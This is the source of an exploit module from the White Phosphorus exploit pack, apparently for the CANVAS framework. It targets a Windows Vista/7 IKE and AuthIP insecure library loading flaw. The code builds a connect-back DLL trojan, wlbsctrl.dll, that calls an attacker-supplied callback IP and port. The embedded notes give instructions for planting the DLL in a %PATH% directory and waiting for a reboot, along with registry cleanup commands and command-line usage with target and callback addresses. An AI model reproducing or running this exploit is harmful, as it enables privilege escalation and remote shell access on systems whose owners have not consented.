
#! /usr/bin/env python
#####################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
#####################################################################################


import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import time
from struct import *

from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
from exploitutils import *
from tcpexploit import *


NAME = "Microsoft Windows IKE and AuthIP IPsec Keying Insecure Library Loading Privilege Escalation"
DESCRIPTION = "This module exploits an insecure library loading privesc in Microsoft Windows"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='Microsoft'
DOCUMENTATION["Date public"] = "2012-10-09"
DOCUMENTATION["Repeatability"] = "Unlimited"
DOCUMENTATION['CVE Name']="N/A"
DOCUMENTATION['CVE Url'] = 'N/A'
DOCUMENTATION['CVSS'] = '6.3'
DOCUMENTATION["References"] = "https://www.htbridge.com/advisory/HTB23108"
DOCUMENTATION["Notes"] = """
This is a local privilege escalation exploit. A writeable directory in the target's %PATH% environment variable is required for succuessful exploitation.

*** WARNING ***

The dll is locked during exploitation and can only be deleted once the directory that contains it has been removed from %PATH% and a reboot has occured. Until this has been done the system will hang on boot, preventing any user logging in.
Follow all instructions to prevent locking up the machine.
If you loose a node before completing the clean up the machine will reconnect to the listener on next reboot.

Exploitation Instructions:
1. Run the module and upload 'wlbsctrl.dll' from White Phosphorus output directory to a directory in target hosts %PATH%
2. Leave listener on port 5555 running and wait for the next reboot for the privesc to occur

Manual Clean Up Instructions:
1. Execute Piped Command to make note of current contents of %PATH%:
REG QUERY "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v Path

2. Execute Piped Command to remove directory cotaining wlbsctrl.dll from %PATH% (note use of ^ to escape %):
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v Path /t REG_EXPAND_SZ /d ^%SystemRoot^%\system32;^%SystemRoot^%;^%SystemRoot^%\System32\Wbem /f    

3. Execute Piped Command to confirm directory has been removed from %PATH%:
REG QUERY "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v Path

4. Execute canvas command
shutdown /r /f

*** END WARNING ***
"""

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Local"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "Vista", "7" ]

NOTES="""
This is a local privilege escalation exploit. A writeable directory in the target's %PATH% environment variable is required for succuessful exploitation.

*** WARNING ***

The dll is locked during exploitation and can only be deleted once the directory that contains it has been removed from %PATH% and a reboot has occured. Until this has been done the system will hang on boot, preventing any user logging in.
Follow all instructions to prevent locking up the machine.
If you loose a node before completing the clean up the machine will reconnect to the listener on next reboot.

Exploitation Instructions:
1. Run the module and upload 'wlbsctrl.dll' from White Phosphorus output directory to a directory in target hosts %PATH%
2. Leave listener on port 5555 running and wait for the next reboot for the privesc to occur

Manual Clean Up Instructions:
1. Execute Piped Command to make note of current contents of %PATH%:
REG QUERY "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v Path

2. Execute Piped Command to remove directory cotaining wlbsctrl.dll from %PATH% (note use of ^ to escape %):
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v Path /t REG_EXPAND_SZ /d ^%SystemRoot^%\system32;^%SystemRoot^%;^%SystemRoot^%\System32\Wbem /f    

3. Execute Piped Command to confirm directory has been removed from %PATH%:
REG QUERY "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v Path

4. Execute canvas command
shutdown /r /f

*** END WARNING ***

-------------------------------------------------------------------------------
WP> White Phosphorus Exploit Pack
WP> Microsoft WIndows IKE and AuthIP IPsec Keying wlbsctrl Privilege Escalation
-------------------------------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)
-O bind:<port>   (for Bind MOSDEF Shell)

Versions:
0: Windows Universal

Payloads:
0 IE Inject Connect Back
1: HTTPMOSDEF SSL
2: HTTPMOSDEF PLAIN
3: Execute Command

Example:
./commandlineInterface.py -p 5555 -v 17
./3rdparty/White_Phosphorus/exploits/wp_microsoft_windows_ikeauthipsec_wlbsctrl/wp_microsoft_windows_ikeauthipsec_wlbsctrl.py -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:0
"""

PORT = 5555

def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Windows Universal", (0x00000000), [WINALL]]
}

class theexploit(wp_exploit):
    PAYLOADS=["IE Inject Connect Back"]

    DEFAULT_PAYLOAD = 0

    def __init__(self):
        wp_exploit.__init__(self)
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.targets = targets
        self.version = 0
        self.use_universal = True
        self.badstring = "\x00\x0a\x0d\x20"
        self.alignstack = True
        self.filename= "wlbsctrl.dll"
        self.bits64 = False
        return

    def usage(self):
        self.wp_usage(targets,"-F <filename>")
        return        
        
    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return      
        
    def neededListenerTypes(self):
        self.getArgs()

        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    
    
    def getArgs(self):
        self.wp_getShellcodeType()

        if self.target:
            self.host=self.target.interface
        self.filename=self.argsDict.get('filename',self.filename)
        return

    def makefile(self):
        my_os  = canvasos("Windows")
        my_os.arch = 'x86'
        
        self.log('WP> Building MOSDEF DLL Trojan')
        try:
            ret = self.buildmosdeftrojan(self.callback.ip,self.callback.port, target_os=my_os, dll=True, http=False, ssl=False, universal=True)
        except Exception, err:
            self.log("WP> Problem building MOSDEF DLL Trojan: %s"%(err))
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0
        return self.mosdeftrojan

    def run(self):
        filedata=self.makefile()
        outputfile = wp_outputpath(self.filename)
        self.log("WP> Opening %s for output"%outputfile)
        
        fd=file(outputfile,'wb+')
        fd.write(filedata)
        fd.close()
        self.log('WP> Wrote to %s'%(outputfile))
        self.log('WP> Place %s in target host \%PATH\%' % (self.filename))
        self.log('WP> Privesc will occur on next reboot')
        self.log('WP> Do not forget to follow instructions in Exploit Description')
        return 1

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
